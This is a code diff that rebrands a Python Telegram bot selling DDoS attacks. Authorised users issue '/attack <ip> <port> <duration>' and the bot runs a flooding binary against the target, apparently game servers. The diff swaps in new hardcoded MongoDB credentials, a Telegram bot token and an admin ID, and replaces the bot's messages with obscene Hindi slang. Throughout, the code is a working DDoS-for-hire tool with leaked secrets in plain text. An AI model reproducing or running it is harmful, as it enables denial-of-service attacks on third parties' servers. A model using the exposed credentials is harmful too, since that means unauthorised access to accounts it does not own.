@@ -14,14 +14,14 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-MONGO_URI = 'mongodb+srv://Vampirexcheats:vampirexcheats1@cluster0.omdzt.mongodb.net/TEST?retryWrites=true&w=majority&appName=Cluster0'
+MONGO_URI = 'mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/'
 client = MongoClient(MONGO_URI)
-db = client['TEST']
-users_collection = db['VAMPIREXCHEATS']
+db = client['bbc']
+users_collection = db['rajaraj_04']
 redeem_codes_collection = db['redeem_codes0']
 
-TELEGRAM_BOT_TOKEN = '7704003705:AAFDWwSEkaOKSy0UNs1jr-tFsC5KQx-2Kv0'
-ADMIN_USER_ID = 529691217  
+TELEGRAM_BOT_TOKEN = '7750901619:AAHfLz22hAOyHQf5MYovnwxsdZuy7J5kBGc'
+ADMIN_USER_ID = 7855020275 
 
 cooldown_dict = {}
 user_attack_history = {}
@@ -55,19 +55,19 @@ async def start(update: Update, context: CallbackContext):
     user_id = update.effective_user.id  
     user_name = update.effective_user.first_name  
     if not await is_user_allowed(user_id):
-        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot! /get_id*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*access kon tera baap lega lode @rajaraj_04! /get_id*", parse_mode='Markdown')
         return
     message = (
-       "*🚀ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ıllıllı ƔαɱקIııƦǝ ɱσ∂ χ DɗoS̴ S̴ǝƦƔǝƦ ıllıllı 🚀*\n\n"
+       "*WELCOME 🤗 TO RAJA BHAI PAID DDOS *\n\n"
         "*💀Use /attack <ip> <port> <duration>*\n"
-        "*💀ꜱᴇʀᴠᴇʀ ꜰʀᴇᴇᴢ ᴡɪᴛʜ @DEMON_ROCKY 🚀*" 
+        "*💀sever ki chudayi @rajaraj_04 🚀*" 
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
 async def remove_user(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
     if user_id != ADMIN_USER_ID:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to remove users!*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="*💪 nikal lode!*", parse_mode='Markdown')
         return
     if len(context.args) != 1:
         await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
@@ -91,7 +91,7 @@ async def attack(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id
     if not await is_user_allowed(user_id):
-        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*access kon tera baap lega lode @rajaraj_04!*", parse_mode='Markdown')
         return
     args = context.args
     if len(args) != 3:
@@ -99,7 +99,7 @@ async def attack(update: Update, context: CallbackContext):
         return
     ip, port, duration = args
     if not ip.startswith(valid_ip_prefixes):
-        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid IP address! Please use an IP with a valid prefix.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*glt ip dalta h madharcod 😡.*", parse_mode='Markdown')
         return
     cooldown_period = 60
     current_time = datetime.now()
@@ -109,12 +109,12 @@ async def attack(update: Update, context: CallbackContext):
             remaining_time = cooldown_period - int(time_diff)
             await context.bot.send_message(
                 chat_id=chat_id,
-                text=f"*⏳ Wait for Attack finish {remaining_time}*",
+                text=f"*⏳ khatam to hone de lode {remaining_time}*",
                 parse_mode='Markdown'
             )
             return
     if user_id in user_attack_history and (ip, port) in user_attack_history[user_id]:
-        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already attacked this IP and port combination!*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*pahle hi chod diya h to baar baar kya gand dega!*", parse_mode='Markdown')
         return
     cooldown_dict[user_id] = current_time
     if user_id not in user_attack_history:
@@ -123,16 +123,16 @@ async def attack(update: Update, context: CallbackContext):
     await context.bot.send_message(
     chat_id=chat_id,
     text=(
-        f"*💀 ⚠️𝘼𝙏𝙏𝘼𝘾𝙆 𝙄𝙉𝙄𝙏𝙄𝘼𝙏𝙀𝘿!❗ 💀*\n"
-        f"💢 *ꜱɪɢᴍᴀ ꜱᴛʀɪᴋᴇ ɪɴ ᴇꜰᴇᴇᴄᴛ!* 💢\n\n"
-        f"*🎯 ᴛᴀʀɢᴇᴛ ꜱᴇᴛ: {ip}:{port}*\n"
-        f"*⏳ᴅᴜʀᴀᴛɪᴏɴ ʟᴏᴄᴋᴇᴅ: {duration} seconds*\n"
-        f"*🔥ᴜɴʟᴇᴀꜱʜɪɴɢ ꜰᴏʀᴄᴇ. ɴᴏ ᴛᴜʀɴɪɴɢ ʙᴀᴄᴋ. Powered by @vampirexcheats💥*"
+        f"*💀 ⚠️ DANGER ⚡ SEVER FREEZ!❗ 💀*\n"
+        f"💦chodna shuru*!* 💦\n\n"
+        f"*🤯 Location: {ip}:{port}*\n"
+        f"*🤣 kitne der: {duration} seconds*\n"
+        f"*🔥chudai chalu h feedback bhej dena @rajaraj_04💥*"
     ), parse_mode='Markdown')
 
     asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
 
-async def VAMPIREXCHEATS(update: Update, context: CallbackContext):
+async def rajaraj_04(update: Update, context: CallbackContext):
     user_id = update.effective_user.id 
     message = f"YOUR USER ID: `{user_id}`" 
     await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')
@@ -140,7 +140,7 @@ async def VAMPIREXCHEATS(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./VAMPIRE {ip} {port} {duration} 1024 400 ",
+            f"./raja {ip} {port} {duration} 800",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
@@ -152,14 +152,14 @@ async def run_attack(chat_id, ip, port, duration, context):
     except Exception as e:
         await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
     finally:
-        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*😈Bas maal gir gya! 💦💦💦*\n*BGMI KO CHODNE WALE FEEDBACK DE @RAJARAJ_04!*", parse_mode='Markdown')
 
 async def generate_redeem_code(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
     if user_id != ADMIN_USER_ID:
         await context.bot.send_message(
             chat_id=update.effective_chat.id, 
-            text="*❌ You are not authorized to generate redeem codes!*", 
+            text="*tere bas ki nhi h lode!*", 
             parse_mode='Markdown'
         )
         return
@@ -290,7 +290,7 @@ def main():
     application.add_handler(CommandHandler("attack", attack))
     application.add_handler(CommandHandler("gen", generate_redeem_code))
     application.add_handler(CommandHandler("redeem", redeem_code))
-    application.add_handler(CommandHandler("get_id", VAMPIREXCHEATS))
+    application.add_handler(CommandHandler("get_id", rajaraj_04))
     application.add_handler(CommandHandler("users", list_users))
     application.add_handler(CommandHandler("help", help_command))
     
@@ -299,4 +299,4 @@ def main():
 
 if __name__ == '__main__':
     main()
-            
+    
